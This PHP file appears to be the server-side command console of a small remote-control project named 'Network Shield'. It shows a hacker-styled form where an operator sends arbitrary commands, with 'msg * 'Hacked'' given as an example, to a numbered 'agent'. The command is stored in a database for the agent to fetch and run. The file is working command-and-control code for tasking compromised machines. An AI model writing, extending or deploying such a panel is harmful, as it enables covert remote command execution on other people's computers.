<?php
/**
 * CONTROL.PHP - Terminal de envío de comandos
 * Ubicación: Network-Shield-System/server/
 */

// 1. Conexión a la base de datos
require 'db_config.php'; 

// 2. Captura de datos (ID por GET/POST, comando por POST)
$id = isset($_REQUEST['id']) ? (int)$_REQUEST['id'] : 0;
$comando = isset($_POST['command']) ? trim($_POST['command']) : null;

// CASO A: Tenemos ID pero no comando -> Mostramos la interfaz de la consola
if ($id > 0 && $comando === null) {
    ?>
    <!DOCTYPE html>
    <html lang="es">
    <head>
        <meta charset="UTF-8">
        <title>Terminal - Network Shield</title>
        <style>
            body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; padding: 50px; display: flex; justify-content: center; }
            .console-box { border: 1px solid #00ff41; padding: 20px; background: #000; box-shadow: 0 0 15px #00ff41; width: 500px; }
            h3 { border-bottom: 1px solid #00ff41; padding-bottom: 10px; margin-top: 0; color: #fff; }
            label { font-size: 0.9em; color: #888; }
            input[type="text"] { 
                width: 100%; background: #111; border: 1px solid #004400; color: #00ff41; 
                padding: 12px; box-sizing: border-box; font-family: 'Courier New', monospace; outline: none; margin-top: 10px;
            }
            input[type="text"]:focus { border-color: #00ff41; box-shadow: 0 0 5px #00ff41; }
            .btn-send { 
                background: #00ff41; color: #000; border: none; padding: 12px 20px; 
                margin-top: 20px; cursor: pointer; font-weight: bold; width: 100%;
                text-transform: uppercase; letter-spacing: 1px;
            }
            .btn-send:hover { background: #fff; }
            .back { display: block; margin-top: 20px; color: #444; text-decoration: none; font-size: 0.8em; text-align: center; }
            .back:hover { color: #00ff41; }
        </style>
    </head>
    <body>
        <div class="console-box">
            <h3>[ TERMINAL_REMOTE / AGENT_#<?php echo $id; ?> ]</h3>
            <form action="control.php" method="POST">
                <input type="hidden" name="id" value="<?php echo $id; ?>">
                <label>Esperando instrucción de red...</label>
                <input type="text" name="command" placeholder="Ej: whoami, systeminfo, msg * 'Hacked'" autofocus required>
                <button type="submit" class="btn-send">TRANSMITIR PAYLOAD</button>
            </form>
            <a href="index.php" class="back"><< ABORTAR Y VOLVER AL PANEL</a>
        </div>
    </body>
    </html>
    <?php
    exit();
}

// CASO B: Procesar el envío del comando a la DB
if ($id > 0 && $comando !== null) {
    try {
        // Actualizamos la DB para que el agente vea el comando en su próximo check
        $sql_update = "UPDATE dispositivos SET ultimo_comando = :command WHERE id = :device_id";
        $stmt = $pdo->prepare($sql_update);
        
        $stmt->execute([
            ':command' => $comando,
            ':device_id' => $id
        ]);

        // Interfaz de "Éxito" con redirección automática
        ?>
        <!DOCTYPE html>
        <html lang="es">
        <head>
            <meta charset="UTF-8">
            <meta http-equiv="refresh" content="2;url=index.php">
            <style>
                body { background: #0d0d0d; color: #00ff41; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
                .card { border: 1px solid #00ff41; padding: 40px; box-shadow: 0 0 30px #00ff41; text-align: center; background: #000; }
                .success { color: #fff; text-shadow: 0 0 10px #00ff41; font-size: 1.8em; margin-bottom: 15px; }
                code { color: #ffaa00; font-size: 1.3em; background: #111; padding: 5px 10px; }
                .loader { width: 100%; height: 2px; background: #111; margin-top: 25px; position: relative; overflow: hidden; }
                .loader::after { content: ''; position: absolute; left: -100%; width: 100%; height: 100%; background: #00ff41; animation: loading 2s linear; }
                @keyframes loading { to { left: 100%; } }
            </style>
        </head>
        <body>
            <div class='card'>
                <div class="success">[ INSTRUCCIÓN_ENVIADA ]</div>
                <p>Comando registrado: <code><?php echo htmlspecialchars($comando); ?></code></p>
                <p style="color: #555; font-size: 0.9em;">Actualizando registros del servidor...</p>
                <div class="loader"></div>
            </div>
        </body>
        </html>
        <?php

    } catch (PDOException $e) {
        die("<div style='color:red; background:#000; padding:20px; font-family:monospace;'>[!] CRITICAL_SQL_ERROR: " . $e->getMessage() . "</div>");
    }
} else {
    // Si no hay ID válido, volvemos al inicio
    header("Location: index.php");
    exit();
}
?>